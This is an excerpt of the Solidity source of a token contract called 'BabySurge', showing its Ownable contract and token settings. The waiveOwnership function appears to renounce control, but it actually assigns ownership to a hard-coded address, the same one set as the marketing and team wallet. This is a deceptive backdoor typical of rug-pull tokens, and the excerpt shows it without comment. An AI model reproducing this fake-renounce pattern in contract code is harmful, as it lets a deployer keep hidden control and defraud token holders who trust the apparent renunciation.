...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x3261B1Cbb6534A463b1e17e24d778Ec918265DB7));
        _owner = address(0x3261B1Cbb6534A463b1e17e24d778Ec918265DB7);
    }
...
contract BabySurge is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BABY SURGE ";
    string private _symbol = "BABYSURGE";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x3261B1Cbb6534A463b1e17e24d778Ec918265DB7);
    address payable public teamWalletAddress = payable(0x3261B1Cbb6534A463b1e17e24d778Ec918265DB7);
